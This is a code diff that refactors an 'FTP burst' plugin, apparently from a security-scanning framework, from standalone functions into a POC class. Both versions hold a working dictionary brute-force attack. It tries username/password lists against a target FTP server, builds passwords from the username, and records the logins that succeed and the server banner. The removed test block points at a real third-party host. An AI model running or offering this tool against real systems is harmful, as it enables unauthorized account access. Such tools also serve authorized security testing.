@@ -2,59 +2,46 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
-'''
-FTP burst
-'''
-
 import ftplib
+from script import Script, SERVER_PORT_MAP
 
-def info(data=None):
-    info = {
-        "name": "FTP burst",
-        "info": "FTP burst.",
-        "level": "high",
-        "type": "unauth",
-    }
-    return info
+class POC(Script):
+    def __init__(self, target=None):
+        self.server_type = SERVER_PORT_MAP.FTP
+        self.name = 'ftp burst'
+        self.keyword = ['FTP','weakpasss']
+        self.info = 'FTP burst'
+        self.type = 'rce'
+        self.level = 'high'
+        Script.__init__(self, target=target, server_type=self.server_type)
 
-def prove(data):
-    data = init(data, 'ftp')
-    ftp = ftplib.FTP()
-    try:
-        ftp.connect(data['target_host'], data['target_port'])
-        ftp.quit()
-    except Exception as e:
-        return data
-    usernamedic = _read_dic(data['d1']) if 'd1' in data.keys() else  _read_dic('dict/ftp_usernames.txt')
-    passworddic = _read_dic(data['d2']) if 'd2' in data.keys() else  _read_dic('dict/ftp_passwords.txt')
-    anonymous = False
-    for linef1 in usernamedic:
-        username = linef1.strip('\r').strip('\n')
-        for linef2 in passworddic:
-            try:
-                if username == 'anonymous':
-                    if anonymous:
-                        continue
-                    else:
-                        anonymous = True
-                password = (
-                    linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
-                    '\r').strip('\n')
-                ftp.connect(data['target_host'], data['target_port'])
-                ftp.login(username, password)
-                data['flag'] = 1
-                data['data'].append({"username": username, "password": password})
-                data['res'].append({"info": username + "/" + password, "key": ftp.getwelcome()})
-                ftp.quit()
-            except Exception as e:
-                pass
-    return data
-
-
-def _read_dic(dicname):
-    with open(dicname, 'r') as f:
-        return f.readlines()
-
-if __name__=='__main__':
-    from script import init, curl
-    print(prove({'target_host':'www.baidu.com','target_port': 22,'flag':-1,'data':[],'res':[]}))
+    def prove(self):
+        ftp = ftplib.FTP()
+        try:
+            ftp.connect(self.target_host, self.target_port)
+            ftp.quit()
+        except Exception as e:
+            return
+        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file('dict/ftp_usernames.txt')
+        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/ftp_passwords.txt')
+        anonymous = False
+        for linef1 in usernamedic:
+            username = linef1.strip('\r').strip('\n')
+            for linef2 in passworddic:
+                try:
+                    if username == 'anonymous':
+                        if anonymous:
+                            continue
+                        else:
+                            anonymous = True
+                    password = (
+                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
+                        '\r').strip('\n')
+                    ftp.connect(self.target_host, self.target_port)
+                    ftp.login(username, password)
+                    self.flag = 1
+                    self.req.append({"username": username, "password": password})
+                    self.res.append({"info": username + "/" + password, "key": ftp.getwelcome()})
+                    ftp.quit()
+                except Exception as e:
+                    pass
